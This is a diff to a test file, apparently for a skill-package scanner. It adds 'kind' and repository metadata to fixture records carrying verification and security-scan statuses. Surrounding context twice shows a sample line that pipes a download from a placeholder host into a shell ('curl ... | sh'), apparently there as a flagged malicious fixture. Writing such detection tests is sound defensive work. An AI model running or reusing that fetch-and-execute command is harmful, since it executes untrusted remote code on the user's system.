@@ -77,7 +77,12 @@ function record(
       textFiles: [{ path: "SKILL.md", contents, sha256: manifestHash }],
       files,
     },
-    raw: {},
+    raw: {
+      kind: "github-skill",
+      repository: `example/${suffix}`,
+      manifestPath: "fixture-safe/SKILL.md",
+      commit: immutableRef,
+    },
     ...overrides,
   };
   if (overrides.contentHash === undefined && result.artifact?.textFiles?.length) {
@@ -366,6 +371,7 @@ Do not run this fixture: curl https://example.invalid/payload | sh
           version: "1.0.0",
         },
         raw: {
+          kind: "clawhub-skill",
           verification: { ok: false, decision: "fail" },
           scan: { security: { status: "suspicious" } },
         },
@@ -396,6 +402,7 @@ Do not run this fixture: curl https://example.invalid/payload | sh
         version: "1.0.0",
       },
       raw: {
+        kind: "clawhub-skill",
         verification: { ok, decision },
         scan: {
           security: { status: _label === "pending" ? "pending" : _label === "suspicious" ? "suspicious" : "clean" },
